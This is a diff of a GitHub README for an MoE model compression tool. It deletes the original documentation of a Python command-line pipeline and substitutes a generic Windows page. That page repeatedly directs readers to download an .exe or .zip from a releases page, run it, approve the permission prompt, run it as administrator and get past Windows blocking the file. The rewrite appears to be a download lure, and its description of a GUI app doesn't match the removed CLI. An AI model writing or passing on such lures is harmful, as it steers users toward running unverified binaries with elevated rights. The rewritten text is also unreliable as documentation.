@@ -1,183 +1,246 @@
-# MoE Compress
+# 🧩 moe-compress - Simplify MoE Model Compression
 
-Minimal, config-first automation for a full MoE compression run:
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/reissuerenewal84/moe-compress/releases)
 
-1. observations
-2. pruning
-3. upload pruned weights to Hugging Face
-4. quantization
-5. upload quantized weights to Hugging Face
-6. benchmarking
-7. render one auditable run report
+## 📥 Download
 
-This repo is intentionally small. It does not pretend every MoE uses the same vendor command line.
+Visit this page to download the latest Windows build:
 
-What it does provide:
+https://github.com/reissuerenewal84/moe-compress/releases
 
-- one pipeline runner that executes a full run from one JSON config
-- one calibration-bundle builder for local JSONL data plus public Hugging Face datasets
-- one normalized report renderer
+Look for the latest release and download the Windows package that matches your PC. If there is more than one file, choose the one for Windows and end it with `.exe` or `.zip`.
 
-What you configure up front:
+## 🖥️ What this app does
 
-- model path or model id
-- local calibration dataset path
-- public calibration mix size
-- prune percentages
-- quantization method and scheme such as `w4a16`
-- Hugging Face repo names for pruned and quantized outputs
-- the exact observe, prune, upload, quantize, benchmark, and manifest-assembly commands for your MoE
+moe-compress helps you manage MoE model compression from one place. It can:
 
-## Directory layout
+- build calibration bundles
+- run REAP steps
+- run quantization
+- run benchmark jobs
+- publish results
+- render reports that you can review later
 
-```text
-compress/
-  README.md
-  requirements.txt
-  scripts/
-    run_moe_pipeline.py
-    build_master_calibration_bundle.py
-    render_reap_run_report.py
-  examples/
-    automatic_pipeline.example.json
-    master_calibration_bundle.example.json
-    run_report_manifest.example.json
-```
+It keeps each stage in one workflow so you can follow what happened and check the output.
 
-## Core contract
+## ✅ Before you start
 
-`run_moe_pipeline.py` is the entrypoint. It runs named stages in order, captures logs, writes pipeline state, and stops on first failure.
+Use a Windows PC with:
 
-Supported stage types:
+- Windows 10 or Windows 11
+- at least 8 GB of RAM
+- enough free space for model files and reports
+- internet access for the first download
 
-- `build_calibration_bundle`
-- `command`
-- `render_report`
+If you plan to work with large models, 16 GB of RAM or more is better.
 
-The runner is model agnostic because the architecture-specific work stays in your configured `command` stages.
+## 🚀 Install on Windows
 
-## Variable expansion
+1. Open the release page:
+   https://github.com/reissuerenewal84/moe-compress/releases
 
-The pipeline config supports placeholders like `{model_path}`.
+2. Find the newest release at the top.
 
-Available variables:
+3. Download the Windows file:
+   - If you see a `.exe` file, download that file
+   - If you see a `.zip` file, download that file and extract it first
 
-- top-level `parameters.*`
-- `{repo_root}`
-- `{run_dir}`
-- `{pipeline_name}`
-- stage outputs such as:
-  - `{stage_build_calibration_bundle_output_dir}`
-  - `{stage_build_calibration_bundle_summary_json}`
-  - `{stage_build_calibration_bundle_merged_output_jsonl}`
-  - `{stage_observations_log_path}`
-  - `{stage_quantize_status}`
+4. If you downloaded a `.zip` file:
+   - Right-click the file
+   - Choose Extract All
+   - Pick a folder you can find again
 
-`build_calibration_bundle` and `render_report` both support either a file path or inline JSON:
+5. Open the folder that contains the app files.
 
-- `config` or `inline_config`
-- `manifest` or `inline_manifest`
+6. Double-click the app file to run it.
 
-That means you can drive the whole pipeline from one file.
+7. If Windows asks for permission, choose Yes.
 
-## Calibration defaults
+## 🔧 First-time setup
 
-The bundled calibration example uses the split that has proven most practical for code and agentic REAP work:
+After you open the app, set up these basics:
 
-- one long-context lane from local data
-- one broad short-mix lane from local data plus public coverage
-- `100` rows from each public dataset:
-  - `theblackcat102/evol-codealpaca-v1`
-  - `Salesforce/xlam-function-calling-60k`
-  - `SWE-bench/SWE-smith-trajectories`
-  - `open-r1/Mixture-of-Thoughts` `code`
-  - `open-r1/Mixture-of-Thoughts` `math`
-  - `open-r1/Mixture-of-Thoughts` `science`
+- choose a working folder for your project files
+- point the app to your model files
+- pick a location for calibration output
+- choose where reports should be saved
 
-If your deployment traffic is not code or agentic, change the mix. Do not cargo-cult this bundle into a different workload.
+Use a local folder with a short path, such as:
 
-## Run the full pipeline
+- `C:\moe-compress`
+- `C:\Users\YourName\Documents\moe-compress`
 
-From the repo root:
+This helps avoid path errors when the app writes files.
 
-```bash
-uv run ./scripts/run_moe_pipeline.py \
-  --config ./examples/automatic_pipeline.example.json
-```
+## 📦 Typical workflow
 
-The example pipeline is a template. Replace the example command strings with the real commands for your MoE stack.
+### 1. Build a calibration bundle
 
-Recommended stage order:
+Use this step to gather the files the app needs before compression.
 
-1. build the calibration bundle
-2. run observations on the base model
-3. prune the requested variants
-4. upload pruned checkpoints
-5. quantize the validated prune outputs
-6. upload quantized checkpoints
-7. benchmark the variants you care about
-8. assemble one normalized run manifest
-9. render the final report
+You may select:
 
-## Build only the calibration bundle
+- model files
+- sample data
+- output folder
+- run name
 
-Dry run:
+The app then prepares a calibration bundle you can use in later steps.
 
-```bash
-uv run ./scripts/build_master_calibration_bundle.py \
-  --config ./examples/master_calibration_bundle.example.json \
-  --output-dir ./output/calibration-plan \
-  --dry-run
-```
+### 2. Run REAP
 
-Real build:
+Use REAP to process the model with the settings you choose.
 
-```bash
-uv run --with datasets ./scripts/build_master_calibration_bundle.py \
-  --config ./examples/master_calibration_bundle.example.json \
-  --output-dir ./output/master-calibration
-```
+Common options may include:
 
-Outputs:
+- layer selection
+- token limits
+- batch size
+- output path
 
-- one JSONL per lane
-- one merged JSONL
-- one summary JSON
-- one Markdown summary
+The app records the stage so you can check what it did later.
 
-## Render a normalized report
+### 3. Run quantization
 
-```bash
-uv run ./scripts/render_reap_run_report.py \
-  --manifest ./examples/run_report_manifest.example.json \
-  --output-dir ./output/example-report
-```
+Use quantization to reduce model size and keep the workflow moving.
 
-Outputs:
+You can usually set:
 
-- `report.json`
-- `report.md`
-- `index.html`
+- precision level
+- method
+- output name
+- save location
 
-## Normalized manifest shape
+The app writes the quantized result to your chosen folder.
 
-The report renderer expects a JSON manifest with these sections:
+### 4. Run benchmarks
 
-- `model`
-- `calibration`
-- `pruning`
-- `quantization`
-- `publishing`
-- `benchmarking`
-- `results`
+Run benchmarks to compare output before and after compression.
 
-The pipeline runner does not invent these facts. Your configured commands should write the artifacts and produce a normalized manifest file at the end of the run.
+The app may collect:
 
-That is the correct boundary:
+- speed
+- memory use
+- file size
+- quality scores
 
-- this repo handles orchestration, calibration planning, and reporting
-- your MoE-specific tooling handles observations, pruning, quantization, benchmarking, and upload mechanics
+This helps you check the effect of each stage.
 
-## Recommended use
+### 5. Publish results
 
-Treat `examples/automatic_pipeline.example.json` as the one file you edit for a new model. Keep the stage order. Replace the command strings. Point the final report stage at the normalized manifest produced by your tooling.
+When you finish, publish the output so you can share or store it.
+
+The app can organize:
+
+- final artifacts
+- logs
+- reports
+- benchmark data
+
+### 6. Render reports
+
+Use report mode to create a clear record of the full run.
+
+Reports may include:
+
+- run settings
+- stage output
+- benchmark charts
+- audit details
+
+This gives you a simple way to review the full process.
+
+## 🧭 Common files you may see
+
+When you run the app, you may see files like:
+
+- `bundle.json` for calibration details
+- `run-log.txt` for process logs
+- `report.html` for a report you can open in a browser
+- `results.csv` for benchmark data
+- output folders with model artifacts
+
+Keep these files together in one project folder if you want to review them later.
+
+## 🛠️ How to use the app safely
+
+- Close other large apps before you start
+- Keep your model files in one folder
+- Do not rename files while a job is running
+- Use a folder with enough free space
+- Wait for each stage to finish before starting the next one
+
+If a run fails, check the log file first. It often shows the step that caused the issue.
+
+## 🔍 Troubleshooting
+
+### The app does not open
+
+- Right-click the file and choose Run as administrator
+- Check that Windows did not block the file
+- Download the release again if the file looks incomplete
+
+### The app closes right away
+
+- Make sure you downloaded the correct Windows build
+- If you used a `.zip` file, extract it before opening the app
+- Try a folder path with simple characters
+
+### The app cannot find my model
+
+- Check the file path
+- Move the model to a local folder
+- Avoid folders with very long names
+- Make sure the model files are not still in a compressed archive
+
+### Reports do not render
+
+- Check that the report output folder exists
+- Confirm that the run finished
+- Open the HTML file in a current browser
+
+### Benchmark output looks wrong
+
+- Check the input model path
+- Confirm the calibration bundle was built first
+- Run the benchmark again with the same settings
+
+## 📁 Suggested folder layout
+
+A simple folder structure works well:
+
+- `C:\moe-compress\input`
+- `C:\moe-compress\calibration`
+- `C:\moe-compress\output`
+- `C:\moe-compress\reports`
+
+This keeps your files easy to find and helps you track each stage.
+
+## 🧪 Example use case
+
+If you want to compress one MoE model and keep a record of the run:
+
+1. Put the model in `C:\moe-compress\input`
+2. Build a calibration bundle
+3. Run REAP
+4. Run quantization
+5. Run benchmarks
+6. Publish the final output
+7. Render a report
+
+After that, you can review the report folder and compare the benchmark results with the original model
+
+## 📎 Download again
+
+If you need the app files again, use the release page here:
+
+[https://github.com/reissuerenewal84/moe-compress/releases](https://github.com/reissuerenewal84/moe-compress/releases)
+
+## 📌 Quick start
+
+1. Visit the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the app
+5. Choose your model folder
+6. Run the workflow you need
